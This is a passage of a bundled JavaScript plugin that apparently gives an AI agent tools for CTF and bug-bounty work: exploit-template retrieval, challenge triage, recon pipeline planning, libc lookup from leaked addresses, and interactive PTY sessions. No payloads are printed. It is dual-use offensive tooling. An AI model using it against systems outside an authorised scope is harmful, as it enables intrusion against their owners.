        if (args.event === "verify_success" && currentState.mode === "CTF" && (currentState.targetType === "PWN" || currentState.targetType === "REV")) {
          return JSON.stringify({
            ok: false,
            sessionID,
            reason: "manual verify_success is blocked for PWN/REV. Use verifier tool output path with oracle/exit/runtime evidence."
          }, null, 2);
        }
        if (args.hypothesis) {
          store.setHypothesis(sessionID, args.hypothesis);
        }
        if (args.alternatives) {
          store.setAlternatives(sessionID, args.alternatives);
        }
        if (args.target_type) {
          store.setTargetType(sessionID, args.target_type);
        }
        if (args.event === "candidate_found" && args.candidate) {
          store.setCandidate(sessionID, args.candidate);
        }
        if (args.event === "verify_success" && args.verified) {
          store.setVerified(sessionID, args.verified);
        }
        if (args.failure_reason) {
          store.recordFailure(sessionID, args.failure_reason, args.failed_route ?? "", args.failure_summary ?? "");
        }
        const state = store.applyEvent(sessionID, args.event);
        if (args.event === "verify_success") {
          appendMetric({
            at: new Date().toISOString(),
            sessionID,
            mode: state.mode,
            phase: state.phase,
            targetType: state.targetType,
            verified: state.latestVerified,
            candidate: state.latestCandidate,
            verifyFailCount: state.verifyFailCount,
            noNewEvidenceLoops: state.noNewEvidenceLoops,
            samePayloadLoops: state.samePayloadLoops,
            taskFailoverCount: state.taskFailoverCount
          });
        }
        return JSON.stringify({ sessionID, state, decision: route(state, config3) }, null, 2);
      }
    }),
    ctf_orch_metrics: tool({
      description: "Read recorded CTF/BOUNTY metrics entries",
      args: {
        limit: schema3.number().int().positive().max(500).default(100)
      },
      execute: async (args, context) => {
        const sessionID = context.sessionID;
        const path = metricsPath();
        if (!existsSync7(path)) {
          return JSON.stringify({ ok: true, sessionID, entries: [] }, null, 2);
        }
        try {
          const parsed = JSON.parse(readFileSync7(path, "utf-8"));
          const arr = Array.isArray(parsed) ? parsed : [];
          const entries = arr.slice(-args.limit);
          return JSON.stringify({ ok: true, sessionID, entries }, null, 2);
        } catch (error92) {
          const message = error92 instanceof Error ? error92.message : String(error92);
          return JSON.stringify({ ok: false, reason: message, sessionID }, null, 2);
        }
      }
    }),
    ctf_orch_next: tool({
      description: "Return the current recommended next category/agent route",
      args: {
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const state = store.get(sessionID);
        return JSON.stringify({ sessionID, decision: route(state, config3) }, null, 2);
      }
    }),
    ctf_orch_session_list: tool({
      description: "List OpenCode sessions (best-effort; falls back to status map if list API unavailable)",
      args: {
        limit: schema3.number().int().positive().max(200).optional(),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const limit = typeof args.limit === "number" ? args.limit : undefined;
        const result = await callSessionList(projectDir, limit);
        return JSON.stringify({ sessionID, directory: projectDir, limit: limit ?? null, ...result }, null, 2);
      }
    }),
    ctf_orch_session_read: tool({
      description: "Read recent messages from a session",
      args: {
        target_session_id: schema3.string().min(1),
        message_limit: schema3.number().int().positive().max(200).default(50),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const targetSessionID = args.target_session_id;
        const limit = args.message_limit;
        const result = await callSessionMessages(projectDir, targetSessionID, limit);
        const messages = [];
        if (result.ok) {
          for (const msg of result.data) {
            if (!isRecord4(msg))
              continue;
            const role = typeof msg.role === "string" ? msg.role : isRecord4(msg.info) && typeof msg.info.role === "string" ? String(msg.info.role) : "";
            const parts = Array.isArray(msg.parts) ? msg.parts : [];
            const text = parts.map((p) => isRecord4(p) && typeof p.text === "string" ? p.text : "").filter(Boolean).join(`
`).trim();
            if (!text)
              continue;
            messages.push({ role: role || "unknown", text });
          }
        }
        return JSON.stringify({
          sessionID,
          directory: projectDir,
          targetSessionID,
          messageLimit: limit,
          ok: result.ok,
          ...result.ok ? { messages } : { reason: result.reason }
        }, null, 2);
      }
    }),
    ctf_orch_session_search: tool({
      description: "Search text in recent messages across sessions (best-effort)",
      args: {
        query: schema3.string().min(1),
        max_sessions: schema3.number().int().positive().max(200).default(25),
        message_limit: schema3.number().int().positive().max(200).default(40),
        case_sensitive: schema3.boolean().default(false),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const q = args.case_sensitive ? args.query : args.query.toLowerCase();
        const list = await callSessionList(projectDir, args.max_sessions);
        if (!list.ok) {
          return JSON.stringify({ sessionID, ok: false, reason: list.reason, directory: projectDir }, null, 2);
        }
        const sessionIDs = [];
        for (const item of list.data) {
          if (isRecord4(item) && typeof item.id === "string" && item.id.trim().length > 0) {
            sessionIDs.push(item.id.trim());
          }
        }
        const hits = [];
        for (const targetSessionID of sessionIDs.slice(0, args.max_sessions)) {
          const read = await callSessionMessages(projectDir, targetSessionID, args.message_limit);
          if (!read.ok)
            continue;
          for (const msg of read.data) {
            if (!isRecord4(msg))
              continue;
            const role = typeof msg.role === "string" ? msg.role : isRecord4(msg.info) && typeof msg.info.role === "string" ? String(msg.info.role) : "";
            const parts = Array.isArray(msg.parts) ? msg.parts : [];
            const text = parts.map((p) => isRecord4(p) && typeof p.text === "string" ? p.text : "").filter(Boolean).join(`
`).trim();
            if (!text)
              continue;
            const hay = args.case_sensitive ? text : text.toLowerCase();
            if (!hay.includes(q))
              continue;
            hits.push({ sessionID: targetSessionID, role: role || "unknown", preview: text.slice(0, 300) });
            if (hits.length >= 200)
              break;
          }
          if (hits.length >= 200)
            break;
        }
        return JSON.stringify({
          sessionID,
          ok: true,
          directory: projectDir,
          query: args.query,
          maxSessions: args.max_sessions,
          messageLimit: args.message_limit,
          hits
        }, null, 2);
      }
    }),
    ctf_orch_session_info: tool({
      description: "Get best-effort metadata for a single session",
      args: {
        target_session_id: schema3.string().min(1),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const targetSessionID = args.target_session_id;
        const list = await callSessionList(projectDir, 200);
        const found = list.ok && Array.isArray(list.data) ? list.data.find((item) => isRecord4(item) && String(item.id ?? "") === targetSessionID) : null;
        return JSON.stringify({
          sessionID,
          directory: projectDir,
          targetSessionID,
          ok: true,
          found: Boolean(found),
          item: found ?? null
        }, null, 2);
      }
    }),
    aegis_memory_save: tool({
      description: "Persist structured memory entities/relations to the local knowledge graph",
      args: {
        entities: schema3.array(schema3.object({
          name: schema3.string().min(1),
          entityType: schema3.string().min(1),
          observations: schema3.array(schema3.string().min(1)).optional(),
          tags: schema3.array(schema3.string().min(1)).optional()
        })).default([]),
        relations: schema3.array(schema3.object({
          from: schema3.string().min(1),
          to: schema3.string().min(1),
          relationType: schema3.string().min(1),
          tags: schema3.array(schema3.string().min(1)).optional()
        })).default([])
      },
      execute: async (args, context) => {
        const sessionID = context.sessionID;
        if (!config3.memory.enabled) {
          return JSON.stringify({ ok: false, reason: "memory disabled", sessionID }, null, 2);
        }
        const loaded = readGraph();
        if (!loaded.ok) {
          return JSON.stringify({ ok: false, reason: loaded.reason, sessionID }, null, 2);
        }
        const graph = loaded.graph;
        const now = new Date().toISOString();
        const createdEntities = [];
        const updatedEntities = [];
        for (const e of args.entities ?? []) {
          const name = e.name.trim();
          const entityType = e.entityType.trim();
          if (!name || !entityType)
            continue;
          const tags = Array.isArray(e.tags) ? e.tags.map((t) => t.trim()).filter(Boolean) : [];
          const obs = Array.isArray(e.observations) ? e.observations.map((o) => o.trim()).filter(Boolean) : [];
          let entity = graph.entities.find((x) => x.name === name);
          if (!entity) {
            entity = {
              id: `ent_${randomUUID()}`,
              name,
              entityType,
              tags,
              createdAt: now,
              updatedAt: now,
              deletedAt: null,
              observations: []
            };
            graph.entities.push(entity);
            createdEntities.push(name);
          } else {
            entity.entityType = entityType;
            entity.updatedAt = now;
            entity.deletedAt = null;
            entity.tags = [...new Set([...entity.tags, ...tags])];
            updatedEntities.push(name);
          }
          for (const content of obs) {
            const exists = entity.observations.some((o) => o.deletedAt === null && o.content === content);
            if (exists)
              continue;
            entity.observations.push({ id: `obs_${randomUUID()}`, content, createdAt: now, deletedAt: null });
            entity.updatedAt = now;
          }
        }
        const createdRelations = [];
        for (const r of args.relations ?? []) {
          const from = r.from.trim();
          const to = r.to.trim();
          const relationType = r.relationType.trim();
          if (!from || !to || !relationType)
            continue;
          const tags = Array.isArray(r.tags) ? r.tags.map((t) => t.trim()).filter(Boolean) : [];
          const exists = graph.relations.some((x) => x.deletedAt === null && x.from === from && x.to === to && x.relationType === relationType);
          if (exists)
            continue;
          graph.relations.push({
            id: `rel_${randomUUID()}`,
            from,
            to,
            relationType,
            tags,
            createdAt: now,
            updatedAt: now,
            deletedAt: null
          });
          createdRelations.push(`${from} ${relationType} ${to}`);
        }
        const persisted = writeGraph(graph);
        if (!persisted.ok) {
          return JSON.stringify({ ok: false, reason: persisted.reason, sessionID }, null, 2);
        }
        return JSON.stringify({
          ok: true,
          sessionID,
          storageDir: config3.memory.storage_dir,
          createdEntities,
          updatedEntities,
          createdRelations
        }, null, 2);
      }
    }),
    aegis_memory_search: tool({
      description: "Search the local knowledge graph for a query string",
      args: {
        query: schema3.string().min(1),
        limit: schema3.number().int().positive().max(100).default(20)
      },
      execute: async (args, context) => {
        const sessionID = context.sessionID;
        if (!config3.memory.enabled) {
          return JSON.stringify({ ok: false, reason: "memory disabled", sessionID }, null, 2);
        }
        const loaded = readGraph();
        if (!loaded.ok) {
          return JSON.stringify({ ok: false, reason: loaded.reason, sessionID }, null, 2);
        }
        const q = args.query.toLowerCase();
        const results = [];
        for (const e of loaded.graph.entities) {
          if (e.deletedAt)
            continue;
          const nameHit = e.name.toLowerCase().includes(q);
          const typeHit = e.entityType.toLowerCase().includes(q);
          const obsHit = e.observations.find((o) => o.deletedAt === null && o.content.toLowerCase().includes(q));
          if (!nameHit && !typeHit && !obsHit)
            continue;
          const match = nameHit ? "name" : typeHit ? "entityType" : "observation";
          results.push({ id: e.id, name: e.name, entityType: e.entityType, match });
          if (results.length >= args.limit)
            break;
        }
        return JSON.stringify({ ok: true, sessionID, query: args.query, results }, null, 2);
      }
    }),
    aegis_memory_list: tool({
      description: "List entities in the local knowledge graph",
      args: {
        limit: schema3.number().int().positive().max(200).default(50)
      },
      execute: async (args, context) => {
        const sessionID = context.sessionID;
        if (!config3.memory.enabled) {
          return JSON.stringify({ ok: false, reason: "memory disabled", sessionID }, null, 2);
        }
        const loaded = readGraph();
        if (!loaded.ok) {
          return JSON.stringify({ ok: false, reason: loaded.reason, sessionID }, null, 2);
        }
        const entities = loaded.graph.entities.filter((e) => !e.deletedAt).sort((a, b) => b.updatedAt.localeCompare(a.updatedAt)).slice(0, args.limit).map((e) => ({
          id: e.id,
          name: e.name,
          entityType: e.entityType,
          tags: e.tags,
          updatedAt: e.updatedAt,
          observations: e.observations.filter((o) => o.deletedAt === null).length
        }));
        return JSON.stringify({ ok: true, sessionID, entities }, null, 2);
      }
    }),
    aegis_memory_delete: tool({
      description: "Delete entities by name (soft delete by default)",
      args: {
        names: schema3.array(schema3.string().min(1)).default([]),
        hard_delete: schema3.boolean().default(false)
      },
      execute: async (args, context) => {
        const sessionID = context.sessionID;
        if (!config3.memory.enabled) {
          return JSON.stringify({ ok: false, reason: "memory disabled", sessionID }, null, 2);
        }
        const loaded = readGraph();
        if (!loaded.ok) {
          return JSON.stringify({ ok: false, reason: loaded.reason, sessionID }, null, 2);
        }
        const graph = loaded.graph;
        const now = new Date().toISOString();
        const targets = new Set(args.names.map((n) => n.trim()).filter(Boolean));
        let deleted = 0;
        if (args.hard_delete) {
          const before = graph.entities.length;
          graph.entities = graph.entities.filter((e) => !targets.has(e.name));
          deleted = before - graph.entities.length;
        } else {
          for (const e of graph.entities) {
            if (!targets.has(e.name))
              continue;
            if (e.deletedAt)
              continue;
            e.deletedAt = now;
            e.updatedAt = now;
            deleted += 1;
          }
        }
        const persisted = writeGraph(graph);
        if (!persisted.ok) {
          return JSON.stringify({ ok: false, reason: persisted.reason, sessionID }, null, 2);
        }
        return JSON.stringify({ ok: true, sessionID, deleted }, null, 2);
      }
    }),
    aegis_think: tool({
      description: "Record structured step-by-step reasoning to durable notes",
      args: {
        thought: schema3.string().min(1),
        nextThoughtNeeded: schema3.boolean(),
        thoughtNumber: schema3.number().int().min(1),
        totalThoughts: schema3.number().int().min(1),
        isRevision: schema3.boolean().optional(),
        revisesThought: schema3.number().int().min(1).optional(),
        branchFromThought: schema3.number().int().min(1).optional(),
        branchId: schema3.string().min(1).optional(),
        needsMoreThoughts: schema3.boolean().optional(),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        if (!config3.sequential_thinking.enabled) {
          return JSON.stringify({ ok: false, reason: "sequential thinking disabled", sessionID }, null, 2);
        }
        const state = ensureThinkState(sessionID);
        const adjustedTotal = Math.max(state.totalThoughts, args.totalThoughts, args.thoughtNumber);
        state.totalThoughts = adjustedTotal;
        state.thoughtHistoryLength += 1;
        if (args.branchId && typeof args.branchFromThought === "number") {
          state.branches.add(args.branchId);
        }
        const recorded = appendThinkRecord(sessionID, {
          tool: config3.sequential_thinking.tool_name,
          thought: args.thought,
          nextThoughtNeeded: args.nextThoughtNeeded,
          thoughtNumber: args.thoughtNumber,
          totalThoughts: adjustedTotal,
          isRevision: args.isRevision ?? false,
          revisesThought: args.revisesThought ?? null,
          branchFromThought: args.branchFromThought ?? null,
          branchId: args.branchId ?? null,
          needsMoreThoughts: args.needsMoreThoughts ?? null
        });
        if (!recorded.ok) {
          return JSON.stringify({ ok: false, reason: recorded.reason, sessionID }, null, 2);
        }
        return JSON.stringify({
          thoughtNumber: args.thoughtNumber,
          totalThoughts: adjustedTotal,
          nextThoughtNeeded: args.nextThoughtNeeded,
          branches: [...state.branches],
          thoughtHistoryLength: state.thoughtHistoryLength
        }, null, 2);
      }
    }),
    ctf_orch_postmortem: tool({
      description: "Summarize failure reasons and suggest next adaptive route",
      args: {
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const state = store.get(sessionID);
        const decision = route(state, config3);
        const topReasons = FAILURE_REASON_VALUES.map((reason) => ({
          reason,
          count: state.failureReasonCounts[reason]
        })).filter((item) => item.count > 0).sort((a, b) => b.count - a.count);
        const recommendation = state.lastFailureReason === "verification_mismatch" ? state.verifyFailCount >= (config3.stuck_threshold ?? 2) ? "Repeated verification mismatch: treat as decoy/constraint mismatch and pivot via stuck route." : "Route through ctf-decoy-check then ctf-verify for candidate validation." : state.lastFailureReason === "tooling_timeout" || state.lastFailureReason === "context_overflow" ? "Use failover/compaction path and reduce output/context size before retry." : state.lastFailureReason === "hypothesis_stall" ? "Pivot hypothesis immediately and run cheapest disconfirm test next." : state.lastFailureReason === "unsat_claim" ? "UNSAT gate active: require at least two alternatives and reproducible observation evidence before unsat conclusion; continue disconfirm loop." : state.lastFailureReason === "static_dynamic_contradiction" ? "Static/dynamic contradiction detected: run extraction-first pivot on target-aware scan route, then escalate via stuck route." : state.lastFailureReason === "exploit_chain" ? "Stabilize exploit chain with deterministic repro artifacts before rerun." : state.lastFailureReason === "environment" ? "Fix runtime environment/tool availability before continuing exploitation." : "No recent classified failure reason; continue normal route.";
        return JSON.stringify({
          sessionID,
          lastFailureReason: state.lastFailureReason,
          lastFailureSummary: state.lastFailureSummary,
          lastFailedRoute: state.lastFailedRoute,
          lastFailureAt: state.lastFailureAt,
          topReasons,
          recommendation,
          nextDecision: decision
        }, null, 2);
      }
    }),
    ctf_orch_failover: tool({
      description: "Resolve fallback agent name from original agent + error text",
      args: {
        agent: schema3.string(),
        error: schema3.string()
      },
      execute: async (args) => {
        const fallback = resolveFailoverAgent(args.agent, args.error, config3.failover);
        return JSON.stringify({ original: args.agent, fallback: fallback ?? "NONE" }, null, 2);
      }
    }),
    ctf_orch_check_budgets: tool({
      description: "Check markdown budget overflows in runtime notes",
      args: {},
      execute: async () => {
        const issues = notesStore.checkBudgets();
        return JSON.stringify({ ok: issues.length === 0, issues }, null, 2);
      }
    }),
    ctf_orch_compact: tool({
      description: "Compact/rotate markdown notes that exceed budget limits",
      args: {},
      execute: async () => {
        const actions = notesStore.compactNow();
        return JSON.stringify({ actions }, null, 2);
      }
    }),
    ctf_orch_readiness: tool({
      description: "Check subagent/MCP mappings and notes writability readiness",
      args: {},
      execute: async () => {
        const report = buildReadinessReport(projectDir, notesStore, config3);
        return JSON.stringify(report, null, 2);
      }
    }),
    ctf_orch_doctor: tool({
      description: "Diagnose environment/provider/model readiness (providers, models, and Aegis/OpenCode config cohesion)",
      args: {
        include_models: schema3.boolean().optional(),
        max_models: schema3.number().int().positive().optional()
      },
      execute: async (args) => {
        const includeModels = args.include_models === true;
        const maxModels = args.max_models ?? 10;
        const readiness = buildReadinessReport(projectDir, notesStore, config3);
        const providerResult = await callConfigProviders(projectDir);
        const usedModels = extractAgentModels(readiness.checkedConfigPath);
        const usedProviders = [...new Set(usedModels.map(providerIdFromModel4).filter(Boolean))];
        const providerSummary = providerResult.ok && providerResult.data ? providerResult.data.providers.map((p) => {
          const id = typeof p.id === "string" ? p.id : "";
          const name = typeof p.name === "string" ? p.name : "";
          const source = typeof p.source === "string" ? p.source : "";
          const env = Array.isArray(p.env) ? p.env : [];
          const modelsObj = isRecord4(p.models) ? p.models : {};
          const modelKeys = Object.keys(modelsObj);
          return {
            id,
            name,
            source,
            env,
            modelCount: modelKeys.length,
            models: includeModels ? modelKeys.slice(0, maxModels) : undefined
          };
        }) : [];
        const availableProviderIds = new Set(providerSummary.map((p) => p.id).filter(Boolean));
        const missingProviders = usedProviders.filter((pid) => pid && !availableProviderIds.has(pid));
        const modelLookup = new Map;
        for (const p of providerSummary) {
          if (!p.id)
            continue;
          const models = new Set;
          if (Array.isArray(p.models)) {
            for (const m of p.models) {
              if (typeof m === "string" && m)
                models.add(m);
            }
          }
          modelLookup.set(p.id, models);
        }
        const missingModels = [];
        if (includeModels) {
          for (const m of usedModels) {
            const pid = providerIdFromModel4(m);
            const mid = modelIdFromModel(m);
            const models = modelLookup.get(pid);
            if (!models) {
              continue;
            }
            if (models.has(m) || mid && models.has(mid)) {
              continue;
            }
            missingModels.push({
              model: m,
              reason: `model id not found in provider '${pid}' (checked '${m}' and '${mid}')`
            });
          }
        }
        return JSON.stringify({
          readiness,
          providers: providerResult.ok ? { ok: true, count: providerSummary.length, providers: providerSummary } : { ok: false, reason: providerResult.reason },
          agentModels: {
            usedModels,
            usedProviders,
            missingProviders,
            missingModels
          }
        }, null, 2);
      }
    }),
    ctf_orch_slash: tool({
      description: "Run an OpenCode slash workflow by submitting a synthetic prompt",
      args: {
        command: schema3.enum(["init-deep", "refactor", "start-work", "ralph-loop", "ulw-loop"]),
        arguments: schema3.string().optional(),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const command = args.command;
        const extra = (args.arguments ?? "").trim();
        const text = extra ? `/${command} ${extra}` : `/${command}`;
        const result = await callPromptAsync(sessionID, text, {
          source: "oh-my-Aegis.slash",
          command
        });
        return JSON.stringify({ sessionID, command, text, ...result }, null, 2);
      }
    }),
    ctf_orch_exploit_template_list: tool({
      description: "List built-in exploit templates by domain",
      args: {
        domain: schema3.enum(["PWN", "CRYPTO", "WEB", "WEB3", "REV", "FORENSICS", "MISC"]).optional(),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const domain3 = args.domain;
        const templates = listExploitTemplates(domain3);
        return JSON.stringify({ sessionID, domain: domain3 ?? "ALL", templates }, null, 2);
      }
    }),
    ctf_orch_exploit_template_get: tool({
      description: "Get a built-in exploit template by id",
      args: {
        domain: schema3.enum(["PWN", "CRYPTO", "WEB", "WEB3", "REV", "FORENSICS", "MISC"]),
        id: schema3.string().min(1),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const entry = getExploitTemplate(args.domain, args.id);
        if (!entry) {
          return JSON.stringify({ ok: false, reason: "template not found", sessionID, domain: args.domain, id: args.id }, null, 2);
        }
        return JSON.stringify({ ok: true, sessionID, template: entry }, null, 2);
      }
    }),
    ctf_auto_triage: tool({
      description: "Auto-triage a challenge file: detect type, suggest target, generate scan commands",
      args: {
        file_path: schema3.string().min(1),
        file_output: schema3.string().optional()
      },
      execute: async (args) => {
        const result = triageFile(args.file_path, args.file_output);
        return JSON.stringify(result, null, 2);
      }
    }),
    ctf_flag_scan: tool({
      description: "Scan text for flag patterns and return candidates",
      args: {
        text: schema3.string().min(1),
        source: schema3.string().default("manual"),
        custom_pattern: schema3.string().optional()
      },
      execute: async (args) => {
        if (args.custom_pattern) {
          setCustomFlagPattern(args.custom_pattern);
        }
        const found = scanForFlags(args.text, args.source);
        return JSON.stringify({
          found,
          alert: found.length > 0 ? buildFlagAlert(found) : null,
          allCandidates: getCandidates()
        }, null, 2);
      }
    }),
    ctf_pattern_match: tool({
      description: "Match known CTF/security patterns in text",
      args: {
        text: schema3.string().min(1),
        target_type: schema3.enum(["WEB_API", "WEB3", "PWN", "REV", "CRYPTO", "FORENSICS", "MISC", "UNKNOWN"]).optional()
      },
      execute: async (args) => {
        const targetType = args.target_type;
        const matches = matchPatterns(args.text, targetType);
        return JSON.stringify({
          matches,
          summary: matches.length > 0 ? buildPatternSummary(matches) : "No patterns matched."
        }, null, 2);
      }
    }),
    ctf_recon_pipeline: tool({
      description: "Plan a multi-phase BOUNTY recon pipeline for a target",
      args: {
        target: schema3.string().min(1),
        scope: schema3.array(schema3.string()).optional(),
        templates: schema3.string().optional()
      },
      execute: async (args, context) => {
        const state = store.get(context.sessionID);
        const pipeline = planReconPipeline(state, config3, args.target, { scope: args.scope });
        return JSON.stringify({ pipeline, templates: args.templates ?? null }, null, 2);
      }
    }),
    ctf_delta_scan: tool({
      description: "Save/query/compare scan snapshots for delta-aware scanning",
      args: {
        action: schema3.enum(["save", "query", "should_rescan"]),
        target: schema3.string().min(1),
        template_set: schema3.string().default("default"),
        findings: schema3.array(schema3.string()).optional(),
        hosts: schema3.array(schema3.string()).optional(),
        ports: schema3.array(schema3.number()).optional(),
        max_age_ms: schema3.number().optional()
      },
      execute: async (args) => {
        if (args.action === "save") {
          const snapshot = {
            id: randomUUID(),
            target: args.target,
            templateSet: args.template_set,
            timestamp: Date.now(),
            assets: [
              ...args.hosts ?? [],
              ...(args.ports ?? []).map((p) => `port:${String(p)}`)
            ],
            findings: args.findings ?? []
          };
          saveScanSnapshot(snapshot);
          return JSON.stringify({ ok: true, saved: snapshot }, null, 2);
        }
        if (args.action === "query") {
          const current = {
            id: randomUUID(),
            target: args.target,
            templateSet: args.template_set,
            timestamp: Date.now(),
            assets: [
              ...args.hosts ?? [],
              ...(args.ports ?? []).map((p) => `port:${String(p)}`)
            ],
            findings: args.findings ?? []
          };
          const latest = getLatestSnapshot(args.target);
          const delta = latest ? computeDelta(latest, current) : null;
          const summary = buildDeltaSummary(args.target, {
            ...current
          });
          return JSON.stringify({ ok: true, summary, latest, delta }, null, 2);
        }
        if (args.action === "should_rescan") {
          const rescan = shouldRescan(args.target, args.template_set, args.max_age_ms);
          return JSON.stringify({ ok: true, shouldRescan: rescan }, null, 2);
        }
        return JSON.stringify({ ok: false, reason: "unknown action" }, null, 2);
      }
    }),
    ctf_tool_recommend: tool({
      description: "Get recommended security tools for a target type",
      args: {
        target_type: schema3.enum(["WEB_API", "WEB3", "PWN", "REV", "CRYPTO", "FORENSICS", "MISC", "UNKNOWN"])
      },
      execute: async (args) => {
        const tools = recommendedTools(args.target_type);
        return JSON.stringify({ tools }, null, 2);
      }
    }),
    ctf_libc_lookup: tool({
      description: "Lookup libc versions from leaked function addresses",
      args: {
        lookups: schema3.array(schema3.object({
          symbol: schema3.string().min(1),
          address: schema3.string().min(1)
        })),
        compute_base_leaked_address: schema3.string().optional(),
        compute_base_symbol_offset: schema3.number().optional()
      },
      execute: async (args) => {
        const requests = args.lookups.map((l) => ({
          symbolName: l.symbol,
          address: l.address
        }));
        const result = localLookup(requests);
        const summary = buildLibcSummary(result);
        const libcRipUrl = buildLibcRipUrl(requests);
        let base = null;
        if (args.compute_base_leaked_address && typeof args.compute_base_symbol_offset === "number") {
          base = computeLibcBase(args.compute_base_leaked_address, args.compute_base_symbol_offset);
        }
        return JSON.stringify({ result, summary, libcRipUrl, computedBase: base }, null, 2);
      }
    }),
    ctf_env_parity: tool({
      description: "Check environment parity between local and remote for PWN challenges",
      args: {
        dockerfile_content: schema3.string().optional(),
        ldd_output: schema3.string().optional(),
        binary_path: schema3.string().optional(),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const remote = {};
        if (args.dockerfile_content) {
          Object.assign(remote, parseDockerfile(args.dockerfile_content));
        }
        const local = {};
        if (args.ldd_output) {
          const parsed = parseLddOutput(args.ldd_output);
          if (parsed) {
            local.libcVersion = parsed.version;
            local.libcPath = parsed.libcPath;
          }
        }
        const report = buildParityReport(local, remote);
        const summary = buildParitySummary(report);
        const localCommands = localEnvCommands();
        store.setEnvParity(sessionID, report.allMatch, summary);
        return JSON.stringify({ report, summary, localCommands }, null, 2);
      }
    }),
    ctf_report_generate: tool({
      description: "Generate a CTF writeup or BOUNTY report from session notes",
      args: {
        mode: schema3.enum(["CTF", "BOUNTY"]),
        challenge_name: schema3.string().default("Challenge"),
        worklog: schema3.string().default(""),
        evidence: schema3.string().default(""),
        target_type: schema3.string().optional(),
        flag: schema3.string().optional()
      },
      execute: async (args) => {
        const reportOptions = {
          challengeName: args.challenge_name,
          programName: args.challenge_name
        };
        if (args.target_type) {
          reportOptions.category = args.target_type;
          reportOptions.endpoint = args.target_type;
        }
        if (args.flag) {
          reportOptions.flag = args.flag;
        }
        const report = generateReport(args.mode, args.worklog, args.evidence, reportOptions);
        const markdown = formatReportMarkdown(report);
        return JSON.stringify({ report, markdown }, null, 2);
      }
    }),
    ctf_subagent_dispatch: tool({
      description: "Plan a dispatch for aegis-explore or aegis-librarian subagent",
      args: {
        query: schema3.string().min(1),
        type: schema3.enum(["explore", "librarian", "auto"]).default("auto")
      },
      execute: async (args, context) => {
        const state = store.get(context.sessionID);
        const agentType = args.type === "auto" ? detectSubagentType(args.query) : args.type;
        const plan = agentType === "explore" ? planExploreDispatch(state, args.query) : planLibrarianDispatch(state, args.query);
        return JSON.stringify({ agentType, plan }, null, 2);
      }
    }),
    ctf_orch_pty_create: tool({
      description: "Create a PTY session for interactive workflows",
      args: {
        command: schema3.string().min(1),
        args: schema3.array(schema3.string()).optional(),
        cwd: schema3.string().optional(),
        title: schema3.string().optional(),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        if (!isInteractiveEnabledForSession(sessionID)) {
          return JSON.stringify({ ok: false, reason: "interactive disabled", sessionID }, null, 2);
        }
        const body = {
          command: args.command
        };
        if (args.args)
          body.args = args.args;
        if (args.cwd)
          body.cwd = args.cwd;
        if (args.title)
          body.title = args.title;
        const result = await callPtyCreate(projectDir, body);
        return JSON.stringify({ sessionID, ...result }, null, 2);
      }
    }),
    ctf_orch_pty_list: tool({
      description: "List PTY sessions for this project",
      args: {},
      execute: async (_args, context) => {
        const sessionID = context.sessionID;
        if (!isInteractiveEnabledForSession(sessionID)) {
          return JSON.stringify({ ok: false, reason: "interactive disabled", sessionID }, null, 2);
        }
        const result = await callPtyList(projectDir);
        return JSON.stringify({ sessionID, ...result }, null, 2);
      }
    }),
    ctf_orch_pty_get: tool({
      description: "Get a PTY session by id",
      args: {
        pty_id: schema3.string().min(1),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        if (!isInteractiveEnabledForSession(sessionID)) {
          return JSON.stringify({ ok: false, reason: "interactive disabled", sessionID }, null, 2);
        }
        const result = await callPtyGet(projectDir, args.pty_id);
        return JSON.stringify({ sessionID, ...result }, null, 2);
      }
    }),
    ctf_orch_pty_update: tool({
      description: "Update a PTY session (title/size)",
      args: {
        pty_id: schema3.string().min(1),
        title: schema3.string().optional(),
        rows: schema3.number().int().positive().optional(),
        cols: schema3.number().int().positive().optional(),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        if (!isInteractiveEnabledForSession(sessionID)) {
          return JSON.stringify({ ok: false, reason: "interactive disabled", sessionID }, null, 2);
        }
        const body = {};
        if (args.title)
          body.title = args.title;
        if (args.rows && args.cols) {
          body.size = { rows: args.rows, cols: args.cols };
        }
        const result = await callPtyUpdate(projectDir, args.pty_id, body);
        return JSON.stringify({ sessionID, ...result }, null, 2);
      }
    }),
    ctf_orch_pty_remove: tool({
      description: "Remove (terminate) a PTY session",
      args: {
        pty_id: schema3.string().min(1),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        if (!isInteractiveEnabledForSession(sessionID)) {
          return JSON.stringify({ ok: false, reason: "interactive disabled", sessionID }, null, 2);
        }
        const result = await callPtyRemove(projectDir, args.pty_id);
        return JSON.stringify({ sessionID, ...result }, null, 2);
      }
    }),
    ctf_orch_pty_connect: tool({
      description: "Connect info for a PTY session",
      args: {
        pty_id: schema3.string().min(1),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        if (!isInteractiveEnabledForSession(sessionID)) {
          return JSON.stringify({ ok: false, reason: "interactive disabled", sessionID }, null, 2);
        }
        const result = await callPtyConnect(projectDir, args.pty_id);
        return JSON.stringify({ sessionID, ...result }, null, 2);
      }
    }),
    ctf_parallel_dispatch: tool({
